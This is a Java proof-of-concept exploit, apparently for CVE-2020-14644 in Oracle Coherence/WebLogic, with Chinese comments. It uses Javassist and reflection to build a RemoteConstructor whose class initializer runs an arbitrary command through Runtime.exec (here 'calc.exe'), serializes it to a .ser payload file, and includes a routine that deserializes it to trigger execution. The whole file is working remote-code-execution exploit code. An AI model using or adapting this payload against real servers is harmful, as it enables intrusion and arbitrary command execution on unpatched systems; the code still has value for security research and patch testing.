import com.tangosol.internal.util.invoke.ClassDefinition;
import com.tangosol.internal.util.invoke.ClassIdentity;
import com.tangosol.internal.util.invoke.RemotableSupport;
import com.tangosol.internal.util.invoke.RemoteConstructor;
import com.tangosol.internal.util.invoke.lambda.LambdaIdentity;
import com.tangosol.util.Base;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.io.*;
import java.lang.reflect.Constructor;

import static com.tangosol.internal.util.invoke.ClassIdentity.md5;

public class CVE_2020_14644 {
    public static void main(String args[])throws Exception {

        RemoteConstructor constructor = createConstructor("calc.exe");
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(new File("cve_2020_14644.ser")));
        out.writeObject(constructor);
        out.flush();
        out.close();
//        readObject();
    }

    public static RemoteConstructor createConstructor(String command) throws Exception {
//        String classname = "com.tangosol.internal.util.invoke.lambda.LambdaIdentity$" + Base.toHex(md5(LambdaIdentity.class));

        //用于生成不同payload
        String packagename = "com/payload";
        String basename = "DEADF1SH_CAT";
        String version = "" + System.nanoTime();
        String classname = "com.payload.DEADF1SH_CAT$" + version;

        //通过反射构造
        Class clazz = ClassIdentity.class;
        Constructor IdCon = clazz.getDeclaredConstructor(String.class,String.class,String.class);
        IdCon.setAccessible(true);//构造方法为protected

        ClassIdentity ClassId = (ClassIdentity) IdCon.newInstance(packagename, basename, version);

        ClassPool pool = ClassPool.getDefault();
        CtClass ct = pool.makeClass(classname);

        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{},ct);
        ctConstructor.setBody("{}");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        ct.makeClassInitializer().insertAfter(cmd);

        byte[] classBytes = ct.toBytecode();

//        RemoteConstructor constructor = new RemoteConstructor(
//                new ClassDefinition(new ClassIdentity(LambdaIdentity.class), classBytes), new Object[]{}
//        );
        RemoteConstructor constructor = new RemoteConstructor(
                new ClassDefinition(ClassId, classBytes), new Object[]{}
        );

        return constructor;
    }

    public static void readObject() {
        FileInputStream fis = null;
        try {
            fis = new FileInputStream(new File("").getAbsolutePath() + "/cve_2020_14644.ser");
            ObjectInputStream ois = new ObjectInputStream(fis);
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
